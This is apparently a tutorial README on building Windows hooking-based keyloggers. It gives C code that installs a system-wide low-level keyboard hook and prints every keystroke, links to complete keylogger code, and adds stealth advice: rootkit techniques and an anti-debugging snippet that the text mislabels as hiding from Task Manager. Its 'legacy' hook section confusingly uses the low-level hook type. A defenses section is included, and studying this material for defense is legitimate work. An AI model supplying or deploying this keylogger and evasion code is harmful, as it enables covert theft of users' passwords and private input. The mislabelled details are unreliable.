# Hooking-Based Keyloggers

Hooking-based keyloggers intercept keyboard input at the OS level by injecting code into the message processing chain. 

## Core Concepts

### 1. Windows Message Processing
Windows uses a message queue system where:
- Keyboard events generate `WM_KEYDOWN`/`WM_KEYUP` messages
- Messages flow: Hardware → Kernel → User-space applications

### 2. Hooking Methods

#### a. WH_KEYBOARD Hook (Legacy) NO system-wide
```c
HHOOK g_hHook = NULL;   // HHOOK is a handle (pointer-like) to a hook instance in Windows.

// KeyboardProc is a callback function, meaning Windows will call it automatically whenever a keyboard event happens.
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) { // Ensures the hook procedure processes only valid hook events.
        if (wParam == WM_KEYDOWN) {

            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;  
            // This structure contains detailed information about the keyboard event, such as the key code, scan code, flags, etc.

            // typedef struct {
            //   DWORD     vkCode;      // Virtual key code
            //   DWORD     scanCode;    // Hardware scan code
            //   DWORD     flags;       // Extended key, injected, etc.
            //   DWORD     time;        // Timestamp
            //   ULONG_PTR dwExtraInfo; // Additional info
            // } KBDLLHOOKSTRUCT;

            printf("Key: 0x%X\n", pKey->vkCode);  
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam); // Returning the value from CallNextHookEx is important for proper hook behavior.
}

// SetHook() calls SetWindowsHookEx, registers your KeyboardProc function as a low-level keyboard hook.
// This tells Windows: When any keyboard event occurs, run KeyboardProc.
void SetHook() {
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    // WH_KEYBOARD_LL: Hook type — low-level keyboard hook that works globally across all threads.
    // KeyboardProc: Pointer to the callback function handling key events.
    // NULL: Module handle for the DLL containing the hook procedure.
    // NULL means the hook procedure is in the current process (must be the case for WH_KEYBOARD_LL).
    // 0: Thread ID — zero means hook is for all threads globally.
    // The function returns a hook handle stored in g_hHook.
    // If it returns NULL, hook installation failed (you should check and handle errors).
}
```

click [here](./Legacy/) to see the Legacy keylogger code


#### Current Windows Restrictions (as of 2023)

- Secure Desktop:

   Low-level hooks blocked on login/password screens

- UI Automation:

   Requires SetProcessDpiAwarenessContext for proper functioning

- User Consent:

   Windows 10+ shows warning indicators for global hooks


global hooks (especially keyboard hooks) can be flagged because they’re often used in keyloggers and spyware.



---


#### b. WH_KEYBOARD_LL (Low-Level, Modern) system-wide

- Captures keyboard input globally, before it’s posted to any thread message queue.
- Works across processes
- Doesn't require DLL injection
- Works for all applications, even games, password fields, or UAC prompts (unless blocked by security).


```c
HHOOK g_hHook = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            // Your logging logic here
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}
```

click [here](./low-level/) to see the Low Level keylogger code



## Advanced Techniques

### 1. DLL Injection for System-Wide Hooking

click [here](../DLL-injection/) to learn

### 2. Direct Input Capture

click [here](../DLL-injection/) to learn



## Stealth Considerations

1. **Rootkit Techniques**:
   - DKOM (Direct Kernel Object Manipulation)
   - SSDT Hooking (Kernel-mode)

2. **Anti-Detection**:
```c
// Hide from Task Manager
typedef NTSTATUS(NTAPI* pNtSetInformationThread)(HANDLE, ULONG, PVOID, ULONG);
pNtSetInformationThread NtSIT = (pNtSetInformationThread)GetProcAddress(GetModuleHandle("ntdll"), "NtSetInformationThread");
if (NtSIT) {
    ULONG hide = 1;
    NtSIT(GetCurrentThread(), 0x11 /*ThreadHideFromDebugger*/, &hide, sizeof(hide));
}
```

## Modern Defenses

1. **PatchGuard** (x64 systems):
   - Blocks kernel hooking
   - Requires signed drivers

2. **Secure Input**:
   - Windows 10+ protected processes
   - Credential UI isolation

---

<br>


> **Note:**  
> When we talk about "system-wide" in the context of hooks like WH_KEYBOARD or WH_KEYBOARD_LL, we mean
> The hook receives keystrokes from every application on the system, not just from the program that installed the hook.  
> For example, if you hook Notepad, you'll also see keys typed in Chrome, Word, games, etc. — that’s system-wide.
> One lives in the process being hooked (KeyboardProc)
> One lives in your process only (LowLevelKeyboardProc)